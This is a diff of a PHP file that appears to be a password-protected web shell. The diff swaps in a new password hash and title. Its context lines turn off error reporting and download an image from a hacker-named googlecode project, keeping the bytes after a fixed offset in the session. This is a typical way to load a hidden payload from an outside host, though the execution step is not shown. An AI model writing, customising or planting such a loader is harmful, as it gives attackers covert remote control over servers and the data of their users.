@@ -11,8 +11,8 @@
 */
 error_reporting(0);
 session_start();
-define('password','781f357c35df1fef3138f6d29670365a'); 
-define('title','山不在高，有仙则名；水不在深，有龙则灵。');
+define('password','9b7972b9374dce312fa17d8e1969555a'); 
+define('title','。');
 define('copyright', 'E');
 if(empty($_SESSION['data'])){
     $_SESSION['data']=substr(file_get_contents('http://2012heike.googlecode.com/svn/trunk/make.jpg'),3649);
